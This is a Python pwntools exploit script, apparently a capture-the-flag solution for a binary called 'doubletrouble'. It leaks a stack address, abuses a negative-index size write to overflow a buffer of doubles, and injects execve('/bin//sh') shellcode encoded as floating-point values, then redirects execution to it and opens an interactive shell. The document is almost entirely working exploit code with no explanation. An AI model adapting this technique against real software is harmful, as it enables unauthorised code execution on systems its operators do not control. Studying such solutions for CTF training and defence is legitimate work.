from pwn import *
import struct

binary = context.binary = ELF("./doubletrouble")

if args.GDB:
    p = gdb.debug(binary.path, gdbscript='b *0x08049733')
else:
    p = process(binary.path)

# Get stack leak
stack = p.recvline()
stack = stack[:-1]
stack = int(stack, 16)
stackaddr = stack + 0x1d8

# get ret gadget and stack addr as one 64 bit integer. Will be converted to float
retval = "0x804900a" + hex(stackaddr)[2:]
retval = int(retval, 16)

# shellcode stored as 4 floats
s1 = str(struct.unpack('d', p64(0x9101eb51e1f7c931))[0]).encode()
s2 = str(struct.unpack('d', p64(0x90909068732f2f68))[0]).encode()
s3 = str(struct.unpack('d', p64(0x9090406e69622f68))[0]).encode()
s4 = str(struct.unpack('d', p64(0x900080cd0bb0e389))[0]).encode()

p.readuntil("How long: ")
p.sendline(b"64")

for i in range(5):
    p.readuntil("Give me: ")
    p.sendline(str(struct.unpack('d', p64(0xff820d8400000000))[0]).encode())

# Trigger size write
p.readuntil("Give me: ")
p.sendline(b'-23')

for i in range(51):
    p.readuntil("Give me: ")
    p.sendline(str(struct.unpack('d', p64(0xff820d8400000000))[0]).encode())

p.sendline(str(struct.unpack('d', p64(0x9000000000000000))[0]).encode())

# Send shellcode
p.sendline(s1)
p.sendline(s2)
p.sendline(s3)
p.sendline(s4)

# send shellcode address
p.sendline(str(struct.unpack('<d', p64(retval))[0]).encode())

# send ret val
p.sendline(str(struct.unpack('d', p64(retval))[0]).encode())

p.interactive()

# struct.unpack('d', p64(0xff820d8400000000))